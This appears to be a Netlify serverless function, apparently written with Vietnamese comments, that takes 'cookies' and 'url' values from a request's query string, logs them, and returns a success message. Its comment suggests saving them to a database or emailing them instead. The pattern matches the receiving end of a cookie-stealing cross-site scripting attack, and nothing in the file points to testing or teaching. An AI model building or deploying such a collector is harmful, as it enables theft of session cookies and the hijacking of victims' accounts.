// netlify-functions/logRequest.js

exports.handler = async (event, context) => {
  const cookies = event.queryStringParameters.cookies || "No cookies";
  const url = event.queryStringParameters.url || "No URL";

  // Ghi thông tin vào log (có thể thay thế bằng việc lưu vào cơ sở dữ liệu hoặc gửi qua email)
  console.log(`Cookies: ${cookies}`);
  console.log(`URL: ${url}`);

  return {
    statusCode: 200,
    body: JSON.stringify({ message: "Data received successfully!" }),
  };
};
